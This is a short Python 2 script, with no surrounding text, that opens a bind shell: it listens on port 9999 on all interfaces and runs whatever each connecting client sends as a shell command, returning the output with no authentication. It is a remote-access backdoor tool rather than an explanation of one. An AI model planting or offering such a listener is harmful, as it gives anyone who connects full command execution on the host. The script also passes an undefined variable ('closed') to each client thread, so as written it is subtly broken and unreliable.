import sys
import socket
import threading
import subprocess

bind_ip = "0.0.0.0" #change if on Windows
bind_port = 9999

if(len(sys.argv) > 1):
     try:
          bind_ip = sys.argv[1]
          bind_port = int(sys.argv[2])
     except Exception:
          pass #lazy



server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server.bind((bind_ip, bind_port))

server.listen(5)

#print "[*] Listening on %s:%d" %(bind_ip, bind_port)

def handle_client(client_socket, closed):
     while True:
          request = client_socket.recv(1024)
          print "[*] Received Request: " + str(request)
          if(request.rstrip("\n") == "exit"):
               break
          else:
               # run the command
               process = subprocess.Popen(request, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
               
               # get the results
               results = process.stdout.read() + process.stderr.read()
               client_socket.send(results)


     client_socket.close()

          


while True:

     client, addr = server.accept()

    # print '[*] Accepted connection from ' + str(addr[0]) + ":" + str(addr[1]) 

     client_handler = threading.Thread(target = handle_client, args = (client, closed))
     client_handler.start()

